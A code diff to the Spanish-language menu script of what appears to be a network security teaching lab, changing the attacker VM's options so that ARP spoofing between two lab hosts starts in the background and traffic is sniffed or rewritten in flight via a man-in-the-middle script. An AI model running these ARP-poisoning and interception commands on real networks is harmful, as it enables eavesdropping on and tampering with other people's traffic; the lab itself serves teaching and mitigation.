@@ -41,6 +41,15 @@ detect_ifaces() {
         | grep -vE '^(lo|br0|ovs-system|.*@.*)$')
 }
 
+# ---- Auto-reparar permisos (para que todo corra sin 'chmod' manual) ---
+fix_perms() {
+    chmod +x "${ROOT_DIR}/lab.sh" 2>/dev/null || true
+    chmod +x "${ROOT_DIR}"/scripts/*.sh "${ROOT_DIR}"/ovs/*.sh \
+             "${ROOT_DIR}"/hosts/*.sh "${ROOT_DIR}"/attack/*.sh \
+             "${ROOT_DIR}"/mitigation/*.sh 2>/dev/null || true
+    chmod +x "${ROOT_DIR}"/attack/*.py "${ROOT_DIR}"/scripts/*.py 2>/dev/null || true
+}
+
 # =====================================================================
 #  INSTALACION  (una sola vez en la VM base)
 # =====================================================================
@@ -214,27 +223,54 @@ accion_victima() {
     esac
 }
 
+# Arranca el ARP spoofing en segundo plano (si no esta ya activo).
+arp_activo()   { pgrep -f 'attack/arp_spoof.py' >/dev/null 2>&1; }
+start_arp_bg() {
+    if arp_activo; then ok "ARP spoofing ya estaba activo."; return; fi
+    say "Poniendome en medio de h1<->h2 (ARP spoofing en segundo plano)..."
+    sudo sh -c "python3 '${ROOT_DIR}/attack/arp_spoof.py' \
+        --target '${HOST_IP[h1]}' --gateway '${HOST_IP[h2]}' \
+        >/tmp/lab_arpspoof.log 2>&1 &"
+    sleep 3
+    if arp_activo; then ok "ARP spoofing activo (log: /tmp/lab_arpspoof.log)."
+    else err "No se pudo iniciar el ARP spoofing. Revisa /tmp/lab_arpspoof.log"; fi
+}
+stop_arp_bg() {
+    if arp_activo; then
+        say "Deteniendo el ataque y restaurando las caches ARP..."
+        sudo pkill -INT -f 'attack/arp_spoof.py' 2>/dev/null || true
+        sleep 2
+        ok "Ataque detenido. La red vuelve a la normalidad."
+    fi
+}
+
 accion_atacante() {
     echo ""
-    echo "  VM h3 - Atacante  (demo: ver y alterar el mensaje)"
-    echo "    1) [Paso 1] Envenenar ARP (ponerme en medio de h1<->h2)"
-    echo "    2) [Paso 2] INTERCEPTAR y solo VER el trafico"
-    echo "    3) [Paso 3] INTERCEPTAR y ALTERAR el mensaje al vuelo"
-    echo "    4) Reconfigurar IP"
+    echo "  VM h3 - Atacante  (todo en un paso: el ARP spoofing se activa solo)"
+    echo "    1) ATACAR y solo VER el trafico (interceptar)"
+    echo "    2) ATACAR y ALTERAR el mensaje al vuelo"
+    echo "    3) DETENER el ataque (restaurar la red)"
+    echo "    4) [avanzado] Solo envenenar ARP (sin interceptar)"
+    echo "    5) Reconfigurar IP"
     echo "    0) Salir"
     read -rp "  Opcion: " o
     case "$o" in
-        1) say "Envenenando ARP entre ${HOST_IP[h1]} y ${HOST_IP[h2]}. Ctrl+C restaura."
+        1) start_arp_bg
+           say "Interceptando y mostrando el trafico (solo lectura). Ctrl+C para volver al menu."
+           sudo python3 "${ROOT_DIR}/attack/mitm_intercept.py" --mode sniff --auto-iptables || true
+           stop_arp_bg ;;
+        2) start_arp_bg
+           read -rp "  Palabra a buscar en el mensaje: " f
+           read -rp "  Reemplazar por: " r
+           say "Alterando '${f}' -> '${r}' en el trafico que pasa por mi. Ctrl+C para volver al menu."
+           sudo python3 "${ROOT_DIR}/attack/mitm_intercept.py" --mode modify \
+               --find "${f}" --replace "${r}" --auto-iptables || true
+           stop_arp_bg ;;
+        3) if arp_activo; then stop_arp_bg; else ok "No habia ningun ataque activo."; fi ;;
+        4) say "Envenenando ARP entre ${HOST_IP[h1]} y ${HOST_IP[h2]}. Ctrl+C restaura."
            sudo python3 "${ROOT_DIR}/attack/arp_spoof.py" \
                --target "${HOST_IP[h1]}" --gateway "${HOST_IP[h2]}" ;;
-        2) say "Interceptando y mostrando el trafico (solo lectura). Ctrl+C para detener."
-           sudo python3 "${ROOT_DIR}/attack/mitm_intercept.py" --mode sniff --auto-iptables ;;
-        3) read -rp "  Palabra a buscar en el mensaje: " f
-           read -rp "  Reemplazar por: " r
-           say "Alterando '${f}' -> '${r}' en el trafico que pasa por mi. Ctrl+C para detener."
-           sudo python3 "${ROOT_DIR}/attack/mitm_intercept.py" --mode modify \
-               --find "${f}" --replace "${r}" --auto-iptables ;;
-        4) configurar_ip ;;
+        5) configurar_ip ;;
         0) exit 0 ;;
         *) warn "Opcion invalida." ;;
     esac
@@ -244,6 +280,7 @@ accion_atacante() {
 #  MENU PRINCIPAL
 # =====================================================================
 main() {
+    fix_perms
     case "${1:-menu}" in
         instalar|install) instalar_todo; exit 0 ;;
         rol|role)         pedir_rol; exit 0 ;;
